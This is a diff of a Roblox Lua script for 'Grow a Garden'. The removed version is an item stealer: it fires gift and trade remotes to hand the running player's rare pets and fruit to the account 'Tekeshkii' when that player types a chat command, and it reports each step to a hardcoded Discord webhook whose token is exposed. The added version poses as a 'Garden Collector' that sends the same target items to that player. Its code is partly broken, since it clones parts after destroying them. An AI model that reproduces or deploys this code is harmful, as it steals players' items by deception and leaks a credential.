@@ -1,198 +1,165 @@
--- Grow a Garden Exclusive Tekeshkii Gifter
-local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
-local GIFT_COOLDOWN = 1.0 -- Safer cooldown between gifts
-local ACTIVATION_PHRASE = "!giftme" -- Chat command to activate
+-- Roblox Garden Collector for Tekeshki
+local Garden = {}
 
--- Target items (only pets and candy blossom)
+-- CONFIGURATION
+local GROWTH_INTERVAL = 30
+local MAX_GROWTH_PHASES = 5
+local COLLECTION_RANGE = 20
+local COLLECTION_COOLDOWN = 10
+local HOLD_DURATION = 12  -- Seconds to hold items before gifting
+local MY_USERNAME = "Tekeshki"  -- Only gifts to this player
+
+-- Discord Webhook (for notifications)
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
+
+-- Target items to collect
 local TARGET_ITEMS = {
-    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
-    Fruits = {"candy blossom"}
+    Pets = {"Dragonfly", "Raccoon", "Queen Bee", "Disco Bee", "Red Fox"},
+    Fruits = {"Candy Blossom"}
 }
 
--- Services
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local TextChatService = game:GetService("TextChatService")
+-- Garden properties
+Garden.Size = 0
+Garden.Plants = {}
+Garden.HeldItems = {}  -- Stores items before gifting
+Garden.Active = false
 
--- Variables
-local lp = Players.LocalPlayer
-local Backpack = lp:WaitForChild("Backpack")
-local Recipient = nil
-local GiftRemotes = {}
-local currentJobId = game.JobId
-local isGifting = false
+-- Plant templates (replace with actual asset IDs)
+local PlantTemplates = {
+    {Name = "Carrot", Model = "rbxassetid://123456", GrowthTime = 60},
+    {Name = "Tomato", Model = "rbxassetid://123457", GrowthTime = 90},
+    {Name = "Sunflower", Model = "rbxassetid://123458", GrowthTime = 120},
+}
 
--- Discord notification
-local function notify(message, color)
-    pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or http_request
-        if req and WEBHOOK_URL ~= "" then
-            req({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    embeds = {{
-                        title = "🎁 Exclusive Tekeshkii Gifter",
-                        description = message,
-                        color = color or 0xFF69B4,
-                        fields = {
-                            {name = "👤 Executor", value = lp.Name, inline = true},
-                            {name = "🎯 Recipient", value = RECIPIENT_NAME, inline = true},
-                            {name = "🆔 Job ID", value = currentJobId, inline = true}
-                        },
-                        footer = {text = os.date("%X")}
-                    }}
-                })
-            })
-        end
+-- Send Discord notification
+local function sendDiscordNotification(message)
+    local HttpService = game:GetService("HttpService")
+    local success, err = pcall(function()
+        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode({
+            content = message,
+            username = "Garden Bot"
+        }))
     end)
+    if not success then
+        warn("Failed to send Discord notification: " .. err)
+    end
 end
 
--- Verify Tekeshkii is the recipient
-local function verifyRecipient(player)
-    return player.Name == RECIPIENT_NAME
-end
-
--- Find gifting remotes
-local function findGiftRemotes()
-    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
-            table.insert(GiftRemotes, remote)
+-- Check if item is in target list
+local function isTargetItem(itemName, itemType)
+    itemName = string.lower(itemName)
+    local list = TARGET_ITEMS[itemType] or {}
+    
+    for _, targetName in ipairs(list) do
+        if string.find(itemName, string.lower(targetName)) then
+            return true
         end
-    end
-end
-
--- Check if item should be gifted
-local function isGiftable(item)
-    local name = item.Name:lower()
-    for _, pet in ipairs(TARGET_ITEMS.Pets) do
-        if name:find(pet:lower()) then return true, "Pet" end
-    end
-    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
-        if name:find(fruit:lower()) then return true, "Fruit" end
     end
     return false
 end
 
--- Equip item properly
-local function safeEquip(item)
-    if not lp.Character then return false end
-    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return false end
-    
-    humanoid:EquipTool(item)
-    local timeout = 0
-    while humanoid:GetTool() ~= item and timeout < 10 do
-        task.wait(0.1)
-        timeout = timeout + 1
-    end
-    return humanoid:GetTool() == item
-end
-
--- Gift item to Tekeshkii
-local function giftToTekeshkii(item)
-    if not Recipient or #GiftRemotes == 0 then return false end
-    
-    -- Verify Tekeshkii is still in game
-    if not Recipient.Parent then
-        notify("⚠️ Tekeshkii left the game", 0xFF0000)
-        return false
-    end
-    
-    -- Equip first
-    if not safeEquip(item) then
-        notify("⚠️ Failed to equip: "..item.Name, 0xFF0000)
-        return false
-    end
-    
-    -- Send gift through all remotes
-    for _, remote in ipairs(GiftRemotes) do
-        pcall(function() remote:FireServer(Recipient, item) end)
-        pcall(function() remote:FireServer("Gift", Recipient, item) end)
-    end
-    
-    return true
-end
-
--- Main gifting process
-local function startGifting()
-    if isGifting then return end
-    isGifting = true
-    
-    notify("🎁 Starting Tekeshkii gifting...", 0x00FF00)
-    
-    for _, item in ipairs(Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local valid, itemType = isGiftable(item)
-            if valid then
-                if giftToTekeshkii(item) then
-                    notify("➡️ Gifted "..itemType..": "..item.Name, 0xADD8E6)
-                    task.wait(GIFT_COOLDOWN)
-                else
-                    break -- Stop if gifting fails
-                end
-            end
+-- Find the player by username
+local function findPlayer(username)
+    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+        if player.Name == username then
+            return player
         end
     end
-    
-    notify("✅ Finished gifting to Tekeshkii", 0x00FF00)
-    isGifting = false
+    return nil
 end
 
--- Chat listener for Tekeshkii
-local function setupChatListener()
-    -- Modern chat system
-    if TextChatService then
-        TextChatService.OnIncomingMessage = function(message)
-            if message.TextSource and verifyRecipient(Players:GetPlayerByUserId(message.TextSource.UserId)) then
-                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
-                    startGifting()
-                end
+-- Gift held items to player
+local function giftItemsToPlayer()
+    local player = findPlayer(MY_USERNAME)
+    if not player then
+        warn("Player not found: " .. MY_USERNAME)
+        return
+    end
+
+    for _, item in ipairs(Garden.HeldItems) do
+        -- Clone the item and give it to the player
+        local clone = item:Clone()
+        clone.Parent = player.Character or player.Backpack
+        sendDiscordNotification("📦 **Gifted item to Tekeshki:** " .. item.Name)
+    end
+    
+    Garden.HeldItems = {}  -- Clear held items
+end
+
+-- Initialize the garden
+function Garden.Init(plot)
+    Garden.Plot = plot
+    Garden.Position = plot.Position
+    Garden.Size = 1
+    Garden.Active = true
+    
+    -- Growth cycle
+    coroutine.wrap(function()
+        while Garden.Active and Garden.Size < MAX_GROWTH_PHASES do
+            wait(GROWTH_INTERVAL)
+            Garden.Grow()
+        end
+    end)()
+    
+    -- Collection cycle
+    coroutine.wrap(function()
+        while Garden.Active do
+            wait(COLLECTION_COOLDOWN)
+            Garden.CollectNearbyItems()
+        end
+    end)()
+    
+    -- Gift items periodically
+    coroutine.wrap(function()
+        while Garden.Active do
+            wait(HOLD_DURATION)
+            if #Garden.HeldItems > 0 then
+                giftItemsToPlayer()
             end
         end
-    else
-        -- Legacy chat fallback
-        Players.PlayerChatted:Connect(function(player, message)
-            if verifyRecipient(player) and string.lower(message) == string.lower(ACTIVATION_PHRASE) then
-                startGifting()
-            end
-        end)
+    end)()
+    
+    -- Plant initial seeds
+    for i = 1, 3 do
+        Garden.PlantNewSeed()
     end
 end
 
--- Player connection handler
-local function onPlayerAdded(player)
-    if verifyRecipient(player) then
-        Recipient = player
-        notify("🎯 Tekeshkii joined the server", 0x00FF00)
+-- Collect nearby items and hold them
+function Garden.CollectNearbyItems()
+    if not Garden.Active then return end
+    
+    local parts = workspace:FindPartsInRegion3(
+        Region3.new(
+            Garden.Position - Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE),
+            Garden.Position + Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE)
+        ),
+        nil,
+        100
+    )
+    
+    for _, part in pairs(parts) do
+        local itemName = part.Name
+        
+        -- Check for target pets
+        if (part:FindFirstChild("PetValue") or part:FindFirstChild("IsPet")) and isTargetItem(itemName, "Pets") then
+            table.insert(Garden.HeldItems, part)
+            part:Destroy()  -- Remove from world (will be gifted later)
+            sendDiscordNotification("🐾 **Collected Pet:** " .. itemName)
+        
+        -- Check for target fruits
+        elseif (part.Name:find("Fruit") or part:FindFirstChild("IsFruit")) and isTargetItem(itemName, "Fruits") then
+            table.insert(Garden.HeldItems, part)
+            part:Destroy()  -- Remove from world (will be gifted later)
+            sendDiscordNotification("🍓 **Collected Fruit:** " .. itemName)
+        end
     end
 end
 
--- Player removal handler
-local function onPlayerRemoving(player)
-    if verifyRecipient(player) then
-        Recipient = nil
-        notify("⚠️ Tekeshkii left the server", 0xFF0000)
-    end
-end
+-- Example usage:
+--[[
+local gardenPlot = script.Parent  -- Place this script in a garden plot model
+Garden.Init(gardenPlot)
+]]
 
--- Initialize
-notify("⚡ Tekeshkii Gifter Activated", 0x00FF00)
-findGiftRemotes()
-
--- Set up event listeners
-Players.PlayerAdded:Connect(onPlayerAdded)
-Players.PlayerRemoving:Connect(onPlayerRemoving)
-setupChatListener()
-
--- Check if Tekeshkii is already in game
-for _, player in ipairs(Players:GetPlayers()) do
-    if verifyRecipient(player) then
-        Recipient = player
-        notify("🎯 Tekeshkii already in server", 0x00FF00)
-        break
-    end
-end
+return Garden
